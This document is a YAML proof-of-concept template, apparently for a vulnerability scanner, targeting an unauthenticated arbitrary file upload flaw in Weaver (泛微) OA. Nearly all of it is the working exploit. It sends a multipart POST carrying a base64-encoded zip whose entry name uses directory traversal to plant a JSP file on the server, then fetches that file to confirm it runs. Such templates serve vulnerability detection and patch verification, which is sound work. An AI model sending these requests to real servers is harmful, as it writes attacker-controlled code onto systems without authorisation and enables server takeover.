app: Weaver
query: app:"Weaver"
meta:
  name: 泛微OA存在未授权任意文件上传漏洞，攻击者可直接上传任意文件，进而控制服务器。
  level: 4
  tags:
  - file_upload
  description: 泛微OA存在未授权任意文件上传漏洞，攻击者可直接上传任意文件，进而控制服务器。
  homepage: ""
  author: X prism
  references: ""
  solution: 安装最新版
  create_at: "2024-07-13 11:52:00"
  available: false
  steps:
    variable: []
    verify_steps:
      type: and
      verify:
      - request:
          method: POST
          path: /weaver/weaver.common.Ctrl/.css?arg0=com.cloudstore.api.service.Service_CheckApp&arg1=validateApp
          redirect: true
          header:
          - Content-Type: multipart/form-data; boundary=----WebKitFormBoundary92pUawKc
          params: " ------WebKitFormBoundary92pUawKc\n        Content-Disposition:
            form-data; name=\"myFile\";filename=\"ss.zip\"\n        \n        {{base64_decode(\"UEsDBBQAAAAIAASPPFZnkUfHXwAAAGgAAAAtAAAALi4vLi4vLi4vNzU1Zjg1YzI3MjNiYjM5MzgxYzczNzlhNjA0MTYwZDguanNwNcZZCoAgFADAq4QgVISUZhpZdBVtw7CUeEbHD4LmaxQeg96WxB7BX9CjXd+awPIAyYvvEaz7bz3JER4U9hFIuOwJ7kyR4HyVfKKCMmNYy2Q1CSZa3ZR11ZSzRFmHhxdQSwECFAAUAAAACAAEjzxWZ5FHx18AAABoAAAALQAAAAAAAAAAAAAAgAEAAAAALi4vLi4vLi4vNzU1Zjg1YzI3MjNiYjM5MzgxYzczNzlhNjA0MTYwZDguanNwUEsFBgAAAAABAAEAWwAAAKoAAAAAAA==\")}}\n
            \       ------WebKitFormBoundary92pUawKc--"
        response:
        - name: code
          value: "200"
          type: equals
      - request:
          method: GET
          path: /cloudstore/755f85c2723bb39381c7379a604160d8.jsp
          redirect: true
          header: []
          params: ""
        response:
        - name: body
          value: 755f85c2723bb39381c7379a604160d8
          type: contains
    exploit_steps:
      type: ""
      params:
        name: ""
        type: input
        value: ""
